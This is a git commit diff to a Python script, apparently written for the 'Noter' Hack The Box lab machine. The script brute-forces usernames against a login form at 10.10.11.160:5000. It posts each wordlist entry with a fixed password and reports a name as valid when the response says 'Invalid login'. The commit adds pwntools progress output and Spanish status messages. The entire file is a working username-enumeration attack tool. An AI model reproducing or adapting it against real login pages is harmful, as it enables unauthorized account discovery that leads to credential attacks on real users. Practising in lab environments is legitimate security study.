ae1a7c805c3c37bd3429d1603e330a43f9e301b7
GatoGamer1155 <Enriquestos1155@gmail.com>
2022-06-08 08:51:00 -0500

    Update Username.py

--- Noter/Username.py
+++ Noter/Username.py
@@ -1,4 +1,10 @@
-import os, requests, sys, signal
+import requests
+try:
+    from pwn import *
+    print("\n[\033[1;34m*\033[1;37m] Iniciando fuerza bruta")
+except:
+    print('\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n')
+    exit(1)
 
 def kill(sig, frame):
     print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
@@ -12,13 +18,14 @@ if len(sys.argv) < 2:
 
 target = "http://10.10.11.160:5000/login"
 dicc = open(sys.argv[1])
-
-print("\n[\033[1;34m*\033[1;37m] Iniciando fuerza bruta\n")
+bf = log.progress("Probando usuario")
+time.sleep(1)
 
 for line in dicc:
     username = line.strip()
     data = {'username': username,'password':'password'}
     request = requests.post(target, data=data)
+    bf.status("%s" % (username))
     response = request.text
     if "Invalid login" in response:
-        print(f"[\033[1;32m+\033[1;37m] El usuario {username} es valido\n")
+        print(f"[\033[1;32m+\033[1;37m] El usuario {username} es válido\n")
